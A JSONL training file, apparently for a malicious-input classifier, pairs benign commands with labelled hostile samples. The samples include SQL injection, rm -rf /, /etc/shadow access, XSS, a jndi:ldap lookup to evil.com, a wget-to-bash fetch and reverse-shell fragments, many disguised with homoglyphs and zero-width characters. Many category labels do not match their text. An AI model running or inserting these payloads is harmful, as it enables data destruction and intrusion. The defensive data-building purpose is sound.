+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ps  aux", "label": 0, "category": "benign_shell"}
+{"text": "nc%20-e", "label": 1, "category": "reverse_shell"}
+{"text": "SELECT * FROM users WHERE id = 1", "label": 0, "category": "benign_sql"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* '; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sort  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "ps  aux", "label": 0, "category": "benign_shell"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  sys", "label": 0, "category": "benign_python"}
+{"text": "REM\n", "label": 1, "category": "privilege_escalation"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\n", "label": 1, "category": "ransomware_pattern"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec( <!-- bypass", "label": 1, "category": "code_execution"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "x  =  1  +  2", "label": 0, "category": "benign_python"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "nc -e /* bypass", "label": 1, "category": "reverse_shell"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "; system(", "label": 1, "category": "system_call"}
+{"text": "REM\n/etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# DELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": "cmd /c eval(", "label": 1, "category": "code_execution"}
+{"text": "perl -e ''", "label": 1, "category": "privilege_escalation"}
+{"text": "powershell -Command \"/dev/tcp\"", "label": 1, "category": "tcp_redirection"}
+{"text": "status  =  system_info.get_uptime()", "label": 0, "category": "benign_hard"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "-- chmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "REM '; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "dir", "label": 0, "category": "benign_shell"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": " # bypass", "label": 1, "category": "credential_dumping"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "delete from", "label": 1, "category": "sql_deletion"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/etc/passwd | echo success", "label": 1, "category": "sensitive_file_access"}
+{"text": "';\t--", "label": 1, "category": "sql_comment_injection"}
+{"text": "DROP  TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "#\nDELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": " ; echo success", "label": 1, "category": "privilege_escalation"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "cmd /c ", "label": 1, "category": "keylogger_installation"}
+{"text": "cmd /c ", "label": 1, "category": "credential_dumping"}
+{"text": "text  =  'Hello  World'.upper()", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT user_id, SUM(amount) FROM orders GROUP BY user_id", "label": 0, "category": "benign_sql"}
+{"text": "rm -rf * && echo done", "label": 1, "category": "destructive_file_operation"}
+{"text": "bash  -i", "label": 1, "category": "interactive_shell"}
+{"text": "Please  explain  this  code", "label": 0, "category": "benign_text"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "print('Hello')", "label": 0, "category": "benign_python"}
+{"text": "dir", "label": 0, "category": "benign_shell"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": "bash -c 'DROP TABLE'", "label": 1, "category": "sql_destructive"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "print('Hello')", "label": 0, "category": "benign_python"}
+{"text": "../ ", "label": 1, "category": "path_traversal"}
+{"text": "TRUNCATE && echo success", "label": 1, "category": "sql_truncation"}
+{"text": "rm+-rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../ -- bypass", "label": 1, "category": "path_traversal"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "SELECT  u.name,  o.total  FROM  users  u  JOIN  orders  o  ON  u.id  =  o.user_id", "label": 0, "category": "benign_sql"}
+{"text": "tail -f log.txt", "label": 0, "category": "benign_shell"}
+{"text": "What  is  the  difference  between  X  and  Y?", "label": 0, "category": "benign_text"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "DROP TABLE ; bypass", "label": 1, "category": "sql_destructive"}
+{"text": "/ETC/SHADOW", "label": 1, "category": "sensitive_file_access"}
+{"text": "How  do  I  install  Python?", "label": 0, "category": "benign_text"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "// This function calls exec(), but with sanitized input", "label": 0, "category": "benign_hard"}
+{"text": "SELECT  u.name,  o.total  FROM  users  u  JOIN  orders  o  ON  u.id  =  o.user_id", "label": 0, "category": "benign_sql"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -la", "label": 0, "category": "benign_shell"}
+{"text": "echo 'passthru'", "label": 1, "category": "passthru_execution"}
+{"text": "echo ''", "label": 1, "category": "sql_union_injection"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash\t-i", "label": 1, "category": "interactive_shell"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "'; -- | echo success", "label": 1, "category": "sql_comment_injection"}
+{"text": "SELECT  COUNT(*)  FROM  orders", "label": 0, "category": "benign_sql"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  'test'.replace('t',  'T')", "label": 0, "category": "benign_python"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "/*\neval(", "label": 1, "category": "code_execution"}
+{"text": "find  .  -name  '*.py'", "label": 0, "category": "benign_shell"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -R", "label": 0, "category": "benign_shell"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  sys", "label": 0, "category": "benign_python"}
+{"text": "bash -c ''", "label": 1, "category": "credential_dumping"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "passthru ; echo success", "label": 1, "category": "passthru_execution"}
+{"text": "//\n'; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "SELECT  COUNT(*)  FROM  orders", "label": 0, "category": "benign_sql"}
+{"text": "Rm -rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "tail  -f  log.txt", "label": 0, "category": "benign_shell"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " ; bypass", "label": 1, "category": "privilege_escalation"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "; /etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "x  =  1  +  2", "label": 0, "category": "benign_python"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM\n", "label": 1, "category": "network_scanning"}
+{"text": "node -e \"passthru\"", "label": 1, "category": "passthru_execution"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How can I improve my code?", "label": 0, "category": "benign_text"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "/*\nwget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION SELECT REM bypass", "label": 1, "category": "sql_injection"}
+{"text": "bash -c 'exec('", "label": 1, "category": "code_execution"}
+{"text": "# cat README.md", "label": 0, "category": "benign_shell"}
+{"text": "#\n/etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* curl http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "words  =  'hello  world'.split()", "label": 0, "category": "benign_python"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "items  =  [x  for  x  in  range(10)]", "label": 0, "category": "benign_python"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": ";\npassthru", "label": 1, "category": "passthru_execution"}
+{"text": "//\nDROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "date", "label": 0, "category": "benign_shell"}
+{"text": "DROP TABLE sessions;", "label": 1, "category": "sql_destructive"}
+{"text": "/*\n", "label": 1, "category": "reverse_shell"}
+{"text": "import  sys", "label": 0, "category": "benign_python"}
+{"text": "head  -n  10  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "--\nrm -rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "chmod 777 <!-- bypass", "label": 1, "category": "permission_escalation"}
+{"text": "How  do  I  install  Python?", "label": 0, "category": "benign_text"}
+{"text": "; bash -i", "label": 1, "category": "interactive_shell"}
+{"text": "while count < 10: count += 1", "label": 0, "category": "benign_python"}
+{"text": "text  =  'Hello  World'.upper()", "label": 0, "category": "benign_python"}
+{"text": "DELETE FROM logs; -- SQL injection", "label": 1, "category": "sql_deletion"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": "bash -c 'TRUNCATE'", "label": 1, "category": "sql_truncation"}
+{"text": "items  =  [x  for  x  in  range(10)]", "label": 0, "category": "benign_python"}
+{"text": "../ REM bypass", "label": 1, "category": "path_traversal"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "#\n/etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "# date", "label": 0, "category": "benign_shell"}
+{"text": "passthru ; bypass", "label": 1, "category": "passthru_execution"}
+{"text": "uniq  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "from  datetime  import  datetime", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#  TODO:  Remove  debug  line:  system('ls')", "label": 0, "category": "benign_hard"}
+{"text": "example_code = 'bash -i >& /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "rm -rf /tmp", "label": 1, "category": "destructive_file_operation"}
+{"text": "grep  'pattern'  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "words  =  'hello  world'.split()", "label": 0, "category": "benign_python"}
+{"text": "perl -e 'rm -rf'", "label": 1, "category": "destructive_file_operation"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec( || echo success", "label": 1, "category": "code_execution"}
+{"text": "REM\nDELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": "numbers  =  [1,  2,  3,  4,  5]", "label": 0, "category": "benign_python"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "<!--\nsystem(", "label": 1, "category": "system_call"}
+{"text": "# uname -a", "label": 0, "category": "benign_shell"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -R", "label": 0, "category": "benign_shell"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "shell_exec ; bypass", "label": 1, "category": "shell_execution"}
+{"text": "-- UNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "name  =  'John  Doe'", "label": 0, "category": "benign_python"}
+{"text": "sort  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec()", "label": 1, "category": "reverse_shell"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": " -- bypass", "label": 1, "category": "keylogger_installation"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": " && echo success", "label": 1, "category": "reverse_shell"}
+{"text": "What  does  this  error  mean?", "label": 0, "category": "benign_text"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Exec(", "label": 1, "category": "code_execution"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  is  the  weather  today?", "label": 0, "category": "benign_text"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash%20-i", "label": 1, "category": "interactive_shell"}
+{"text": "/dev/tcp // bypass", "label": 1, "category": "tcp_redirection"}
+{"text": "import  os", "label": 0, "category": "benign_python"}
+{"text": "eval( ; echo success", "label": 1, "category": "code_execution"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# tail -f log.txt", "label": 0, "category": "benign_shell"}
+{"text": "# bash -i", "label": 1, "category": "interactive_shell"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "SELECT  name,  email  FROM  users", "label": 0, "category": "benign_sql"}
+{"text": "# date", "label": 0, "category": "benign_shell"}
+{"text": " /* bypass", "label": 1, "category": "network_scanning"}
+{"text": "python -c \"\"", "label": 1, "category": "sql_time_based"}
+{"text": "for  item  in  items:  process(item)", "label": 0, "category": "benign_python"}
+{"text": "<!--\nchmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "; /dev/tcp", "label": 1, "category": "tcp_redirection"}
+{"text": "def calculate_sum(a, b): return a + b", "label": 0, "category": "benign_python"}
+{"text": "text  =  'hello  world'.title()", "label": 0, "category": "benign_python"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "def  hello():  return  'world'", "label": 0, "category": "benign_python"}
+{"text": "for  item  in  items:  process(item)", "label": 0, "category": "benign_python"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -R", "label": 0, "category": "benign_shell"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# DROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "powershell -Command \"\"", "label": 1, "category": "reverse_shell"}
+{"text": "ruby -e \"nc -e\"", "label": 1, "category": "reverse_shell"}
+{"text": "powershell -Command \"bash -i\"", "label": 1, "category": "interactive_shell"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " /* bypass", "label": 1, "category": "ransomware_pattern"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " ; echo success", "label": 1, "category": "reverse_shell"}
+{"text": "def  calculate_sum(a,  b):  return  a  +  b", "label": 0, "category": "benign_python"}
+{"text": "import  json", "label": 0, "category": "benign_python"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\n", "label": 1, "category": "sql_union_injection"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": "Passthru", "label": 1, "category": "passthru_execution"}
+{"text": "bash+-i", "label": 1, "category": "interactive_shell"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "uname  -a", "label": 0, "category": "benign_shell"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "WGET HTTP://", "label": 1, "category": "remote_code_fetch"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!-- ", "label": 1, "category": "sql_time_based"}
+{"text": "", "label": 1, "category": "credential_dumping"}
+{"text": "# tail -f log.txt", "label": 0, "category": "benign_shell"}
+{"text": "cmd /c ../", "label": 1, "category": "path_traversal"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\nbash -i", "label": 1, "category": "interactive_shell"}
+{"text": "REM DELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget http://evil.com/payload.sh | bash", "label": 1, "category": "remote_code_fetch"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "node -e \"\"", "label": 1, "category": "keylogger_installation"}
+{"text": "--\n", "label": 1, "category": "credential_dumping"}
+{"text": "/*\nTRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uniq  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "//\n../", "label": 1, "category": "path_traversal"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can  you  help  me  with  this?", "label": 0, "category": "benign_text"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/etc/shadow | echo success", "label": 1, "category": "sensitive_file_access"}
+{"text": "name  =  'John  Doe'", "label": 0, "category": "benign_python"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "python -c \"..\\\"", "label": 1, "category": "path_traversal_windows"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash -c 'system('", "label": 1, "category": "system_call"}
+{"text": "# cat README.md", "label": 0, "category": "benign_shell"}
+{"text": "What  time  is  it?", "label": 0, "category": "benign_text"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sh -c \"/etc/shadow\"", "label": 1, "category": "sensitive_file_access"}
